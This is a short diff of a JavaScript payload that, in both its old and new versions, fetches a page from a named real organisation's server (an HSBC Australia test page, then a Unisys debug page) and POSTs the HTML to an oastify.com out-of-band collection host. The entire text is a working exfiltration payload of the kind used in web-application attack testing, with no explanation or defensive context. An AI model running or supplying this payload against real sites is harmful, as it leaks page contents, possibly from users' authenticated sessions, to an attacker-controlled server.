@@ -1,7 +1,7 @@
-fetch('https://www.sharetrading.hsbc.com.au/test/env.html')
+fetch('https://gls-prod.ito.unisys.com/walert/debug.asp')
   .then(r => r.text())
   .then(html => {
-    fetch('https://a2dspy3g96m1asgr3tjb1sl32u8lwbk0.oastify.com', {
+    fetch('https://f8o4hflzcp6e8299yyz7pz16qxwoke83.oastify.com', {
       method: 'POST',
       body: html
     });
